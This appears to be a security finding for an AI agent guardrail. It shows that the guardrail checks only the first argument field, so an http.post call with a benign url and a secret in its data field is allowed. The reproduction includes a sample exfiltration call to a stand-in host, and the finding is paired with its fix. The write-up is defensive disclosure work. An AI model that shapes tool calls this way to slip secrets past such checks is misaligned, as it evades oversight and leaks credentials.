# WH-EXTRA — `_extract_target` Returns Only First Matched Field

**Severity**: Medium-High (incidental discovery)
**CVSS 3.1 (informational)**: 7.5
**CWE**: [CWE-184 — Incomplete List of Disallowed Inputs](https://cwe.mitre.org/data/definitions/184.html)
**Discovered**: 2026-06-22 (during HardenedGuardrail patch verification)
**Status**: Bug present in the original `OptimalGuardrail`; closed by hardened patch.

---

## Summary

`OptimalGuardrail._extract_target` iterates `("path", "url", "cmd", "data", "body", "content")` and returns the **first** field present in `tool_args`. For an attacker, this means a call shaped like:

```python
http.post(url="https://benign.example.com", data="SECRET_API_KEY=ack")
```

returns `"https://benign.example.com"` as the "target" — the guardrail evaluates a benign URL and approves the call. The secret in `data` is never inspected by `_is_ultra_dangerous`.

The predicate `_contains_secret` *does* check `args.get("data")` directly, so the exfil still fires for scoring purposes — but the guardrail considers the call safe and never denies it. The intended defense is bypassed by the field-priority ordering.

## Reproduction

Before the patch:
```python
from aicomp_sdk.guardrails.optimal import Guardrail
g = Guardrail()
g.decide("http.post",
         {"url": "https://benign.example.com",
          "data": "SECRET_API_KEY=ack"},
         context={}).action  # → DecisionAction.ALLOW   ← bug
```

## Root Cause Analysis

The function's documented intent appears to be "extract the dangerous-looking argument". A first-match-wins return is correct only if the *most-dangerous-first* ordering is enforced. The actual ordering is filesystem-first (path, url) → command-second (cmd) → payload-last (data, body, content). For exfil-class attacks the payload is in `data`, so it gets shadowed by `url`.

## Mitigation — already part of `guardrail_hardened.py`

```python
def _extract_target(self, tool_args: Mapping[str, Any]) -> str:
    parts: list[str] = []
    for key in ("path", "url", "cmd", "data", "body", "content"):
        if key in tool_args:
            parts.append(_normalize_for_guard(str(tool_args[key])))
    return "\n".join(parts)
```

Concatenate all candidate fields after normalization. The substring check then sees the entire surface area.

## Verification

`test_whm2_sk_live_test_blocked` in `test_hardened_guardrail.py` fails before the patch (returns ALLOW), passes after. Same for any test that places a benign `url` alongside a sensitive `data`.

## Related Findings

- WH-M2 (predicate gap) — discovered via the same test; the same patch closes both.
- WH-001 / WH-002 / WH-009 — normalization is the *other* needed change in the same function.
